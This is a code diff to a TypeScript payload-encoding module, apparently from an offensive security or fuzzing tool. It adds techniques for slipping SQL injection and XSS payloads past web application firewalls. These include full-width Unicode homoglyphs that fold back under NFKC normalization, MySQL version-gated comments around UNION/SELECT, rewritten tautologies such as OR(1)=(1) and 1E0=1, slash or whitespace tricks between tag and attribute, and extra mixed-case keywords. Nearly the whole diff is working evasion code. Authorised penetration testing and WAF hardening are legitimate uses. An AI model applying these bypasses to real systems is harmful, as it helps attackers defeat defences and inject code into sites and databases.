@@ -11,6 +11,7 @@ export interface EncodingOptions {
 	base64Encode?: boolean;
 	urlEncode?: boolean;
 	overlongUtf8?: boolean;
+	fullWidth?: boolean;
 }
 
 export class PayloadEncoder {
@@ -69,13 +70,28 @@ export class PayloadEncoder {
 			'ALTER',
 			'EXEC',
 			'EXECUTE',
+			'AND',
+			'OR',
+			'SLEEP',
+			'BENCHMARK',
+			'WAITFOR',
+			'CONCAT',
 			'SCRIPT',
 			'ALERT',
+			'PROMPT',
+			'CONFIRM',
 			'JAVASCRIPT',
 			'VBSCRIPT',
+			'IFRAME',
+			'IMG',
+			'SVG',
 			'ONLOAD',
 			'ONERROR',
 			'ONCLICK',
+			'ONTOGGLE',
+			'ONSTART',
+			'ONFOCUS',
+			'ONMOUSEOVER',
 		];
 
 		let result = payload;
@@ -85,7 +101,10 @@ export class PayloadEncoder {
 				.map((char, index) => (index % 2 === 0 ? char.toLowerCase() : char.toUpperCase()))
 				.join('');
 
-			result = result.replace(new RegExp(keyword, 'gi'), mixedCase);
+			// Word-boundary anchored so short keywords (OR/AND) don't recase
+			// substrings of unrelated, case-sensitive tokens such as
+			// 'constructor' (-> 'constructoR') or 'command' (-> 'commaNd').
+			result = result.replace(new RegExp(`\\b${keyword}\\b`, 'gi'), mixedCase);
 		});
 
 		return result;
@@ -155,6 +174,33 @@ export class PayloadEncoder {
 	}
 
 	/**
+	 * Full-width Unicode encoding.
+	 *
+	 * Maps printable ASCII (0x21-0x7E) to its Unicode "full-width" form
+	 * (U+FF01-U+FF5E), plus space -> ideographic space (U+3000). A WAF that
+	 * inspects the raw request sees exotic
+	 * code points that do not match its ASCII signatures, but an origin
+	 * that runs Unicode NFKC normalization (common in Java/.NET/ICU stacks)
+	 * folds them back to ASCII — e.g. 'ＳＥＬＥＣＴ' NFKC-normalizes to 'SELECT'.
+	 *
+	 * Example: '<script>' -> '＜ｓｃｒｉｐｔ＞'
+	 */
+	static fullWidthEncode(payload: string): string {
+		let out = '';
+		for (const ch of payload) {
+			const code = ch.charCodeAt(0);
+			if (code >= 0x21 && code <= 0x7e) {
+				out += String.fromCharCode(code + 0xfee0);
+			} else if (ch === ' ') {
+				out += '　'; // ideographic space (NFKC -> ' ')
+			} else {
+				out += ch;
+			}
+		}
+		return out;
+	}
+
+	/**
 	 * Apply multiple encoding techniques
 	 */
 	static applyEncodings(payload: string, options: EncodingOptions): string[] {
@@ -197,6 +243,10 @@ export class PayloadEncoder {
 			encodedPayloads.push(this.overlongUtf8Encode(payload));
 		}
 
+		if (options.fullWidth) {
+			encodedPayloads.push(this.fullWidthEncode(payload));
+		}
+
 		return [...new Set(encodedPayloads)]; // Remove duplicates
 	}
 
@@ -225,6 +275,25 @@ export class PayloadEncoder {
 		if (payload.includes('UNION')) {
 			obfuscated.push(payload.replace(/UNION/gi, 'UNI/**/ON'));
 			obfuscated.push(payload.replace(/UNION/gi, 'UN/**/ION'));
+		}
+
+		// MySQL inline-comment / version-gated keywords: the server executes
+		// the content of /*!...*/, but a signature engine may skip it.
+		if (/\b(UNION|SELECT)\b/i.test(payload)) {
+			obfuscated.push(payload.replace(/\bUNION\b/gi, '/*!UNION*/').replace(/\bSELECT\b/gi, '/*!SELECT*/'));
+			obfuscated.push(payload.replace(/\bUNION\b/gi, '/*!50000UNION*/').replace(/\bSELECT\b/gi, '/*!50000SELECT*/'));
+		}
+
+		// Parenthesis-wrapped operands: valid SQL that removes the whitespace
+		// around a boolean tautology (' OR 1=1' -> ' OR(1)=(1)').
+		if (/\bOR\s+1=1/i.test(payload)) {
+			obfuscated.push(payload.replace(/\bOR\s+1=1/gi, 'OR(1)=(1)'));
+		}
+
+		// Scientific-notation / decimal tautology obfuscation (1=1 -> 1E0=1).
+		if (/\b1=1\b/.test(payload)) {
+			obfuscated.push(payload.replace(/\b1=1\b/g, '1E0=1'));
+			obfuscated.push(payload.replace(/\b1=1\b/g, '1.0=1'));
 		}
 
 		return [...new Set(obfuscated)];
@@ -266,6 +335,24 @@ export class PayloadEncoder {
 			obfuscated.push(payload.replace(/<script>/gi, '<script//>'));
 		}
 
+		// Tag/attribute separator obfuscation: browsers accept '/', tab,
+		// newline and form-feed between the tag name and its attributes,
+		// while many WAF regexes expect a literal space.
+		if (/<\w+\s/.test(payload)) {
+			obfuscated.push(payload.replace(/(<\w+)\s+/g, '$1/')); // <svg/onload=...
+			obfuscated.push(payload.replace(/(<\w+)\s+/g, '$1\t'));
+			obfuscated.push(payload.replace(/(<\w+)\s+/g, '$1\n'));
+			obfuscated.push(payload.replace(/(<\w+)\s+/g, '$1\f'));
+		}
+
+		// Superfluous tag bytes that browsers tolerate but signatures may not.
+		if (/<svg/i.test(payload)) {
+			obfuscated.push(payload.replace(/<svg/gi, '<svg//'));
+		}
+		if (/<img/i.test(payload)) {
+			obfuscated.push(payload.replace(/<img/gi, '<img/'));
+		}
+
 		// JavaScript protocol variations
 		if (payload.includes('javascript:')) {
 			obfuscated.push(payload.replace(/javascript:/gi, 'JAVASCRIPT:'));
@@ -291,6 +378,7 @@ export class PayloadEncoder {
 			hexEncode: true,
 			urlEncode: true,
 			overlongUtf8: true,
+			fullWidth: true,
 		};
 
 		variations = variations.concat(this.applyEncodings(payload, encodingOptions));
@@ -359,6 +447,10 @@ export class WAFBypasses {
 		bypasses.push(payload.normalize('NFD'));
 		bypasses.push(payload.normalize('NFKD'));
 		bypasses.push(payload.normalize('NFKC'));
+
+		// Full-width homoglyphs: survive signature matching, fold back to
+		// ASCII under the origin's NFKC normalization.
+		bypasses.push(PayloadEncoder.fullWidthEncode(payload));
 
 		// Prototype Pollution specific bypasses (Case-insensitive matching via /gi)
 		if (/__proto__/i.test(payload)) {
